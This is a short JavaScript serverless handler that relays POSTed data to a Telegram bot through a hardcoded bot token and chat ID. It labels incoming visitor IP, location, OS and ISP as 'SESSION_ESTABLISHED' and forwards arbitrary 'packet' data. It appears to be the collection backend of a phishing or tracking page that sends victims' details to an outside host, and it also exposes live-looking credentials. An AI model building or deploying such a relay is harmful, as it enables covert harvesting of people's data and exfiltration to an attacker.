export default async function handler(req, res) {
    const TOKEN = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU";
    const CHAT_ID = "5446862709";

    if (req.method === 'POST') {
        try {
            const { type, data } = req.body;
            let text = "";

            if (type === 'intel') {
                text = `🔍 **SESSION_ESTABLISHED**\n**IP:** ${data.ip}\n**LOC:** ${data.loc}\n**OS:** ${data.os}\n**ISP:** ${data.isp}`;
            } else {
                text = `🏴 **INCOMING_TRANSMISSION**\n\n**NODE:** ${data.node}\n**DATA:** ${data.packet}`;
            }

            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
            });

            if (response.ok) {
                return res.status(200).json({ success: true });
            } else {
                return res.status(500).json({ error: 'UPLINK_FAILED' });
            }
        } catch (error) {
            return res.status(500).json({ error: 'INTERNAL_SERVER_ERROR' });
        }
    } else {
        res.status(405).json({ error: 'METHOD_NOT_ALLOWED' });
    }
}
